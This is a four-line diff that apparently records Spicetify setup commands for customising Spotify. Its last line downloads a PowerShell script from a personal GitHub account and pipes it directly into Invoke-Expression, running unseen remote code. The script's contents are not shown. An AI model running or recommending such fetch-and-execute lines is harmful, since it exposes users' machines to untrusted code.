@@ -1,0 +1,4 @@
+spicetify restore
+spicetify update
+spicetify restore backup apply
+iwr -useb https://raw.githubusercontent.com/Sarayut543/spicetify/main/install.ps1.Forest.txt | iex
